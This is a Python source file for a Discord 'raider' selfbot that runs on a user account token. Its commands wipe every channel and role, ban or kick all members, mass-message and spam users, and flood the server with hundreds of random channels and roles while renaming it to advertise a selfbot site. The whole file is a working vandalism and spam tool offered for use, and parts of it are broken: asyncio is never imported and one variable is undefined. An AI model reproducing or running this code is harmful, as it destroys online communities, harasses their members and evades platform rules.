
# ----------------- imports ----------------- #
import discord, subprocess, sys, time, os, colorama, base64, codecs, datetime, io, random, numpy, datetime, smtplib, string
import json
from colorama import init, Fore, Back, Style

from discord.ext import (
    commands,
    tasks
)
init(convert=True)
# ----------------- config ----------------- #
with open('config.json') as f:
    config = json.load(f)

    token = config.get('token')
    prefix = config.get('prefix')

bot = discord.Client()
bot = commands.Bot(
   description='xd',
    command_prefix=prefix,
    self_bot=True
)

def RandomColor(): 
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

def RandString():
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))
# ----------------- start up----------------- #
print(f'''
     ██████╗  █████╗ ██╗██████╗ 
     ██╔══██╗██╔══██╗██║██╔══██╗
     ██████╔╝███████║██║██║  ██║
     ██╔══██╗██╔══██║██║██║  ██║
     ██║  ██║██║  ██║██║██████╔╝
     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝ 
 \n
     raider mobile ver
     # cmds #
     ruin - ruins the server
     massban - bans everyone
     masskick - kicks everyone
     dmall <message> - messages everyone
     massrole <amount> <name> - creates x amount of roles
     masschannel <amount> <name> - creates amount of channels
     delroles - deletes every role
     delchannels - deletes every channel
     massunban - unbans everyon
     spam <amount> <message> - spams a message x amount of times
''')
# ----------------- commands ----------------- #
@bot.command()
async def ruin(ctx): # b'\xfc'
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()    
        except:
            pass
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name=RandString(),
            description="https://alucard.wtf",
            reason="https://alucard-selfbot.github.io",
            icon=None,
            banner=None
        )  
    except:
        pass        
    for _i in range(250):
        await ctx.guild.create_text_channel(name=RandString())
    for _i in range(250):
        await ctx.guild.create_role(name=RandString(), color=RandomColor())

@bot.command()
async def dmall(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await asyncio.sleep(5)    
            await user.send(message)
        except:
            pass

@bot.command()
async def massban(ctx): # b'\xfc'
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    

@bot.command()
async def masskick(ctx): # b'\xfc'
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.kick()
        except:
            pass    

@bot.command()
async def massrole(ctx, amount: int, *, message): # b'\xfc'
    await ctx.message.delete()
    for _i in range(amount):
        try:
            await ctx.guild.create_role(name=name, color=RandomColor())
        except:
            return    

@bot.command()
async def masschannel(ctx, amount: int, *, message): # b'\xfc'
    await ctx.message.delete()
    for _i in range(amount):
        try:
            await ctx.guild.create_text_channel(name=message)
        except:
            return

@bot.command()
async def delchannels(ctx): # b'\xfc'
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return

@bot.command() 
async def delroles(ctx): # b'\xfc'
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass

@bot.command()
async def massunban(ctx): # b'\xfc'
    await ctx.message.delete()    
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass

@bot.command()
async def spam(ctx, amount: int, *, message): # b'\xfc'
    await ctx.message.delete()    
    for _i in range(amount):
        await ctx.send(message)
# ----------------- run ----------------- #
bot.run(token, bot=False)

# cmds
# ruin - ruins the server
# massban - bans everyone
# masskick - kicks everyone
# dmall <message> - messages everyone
# massrole <amount> <name> - creates x amount of roles
# masschannel <amount> <name> - creates x amount of channels
# delroles - deletes every role
# delchannels - deletes every channel
# massunban - unbans everyon
# spam <amount> <message> - spams a message x amount of times
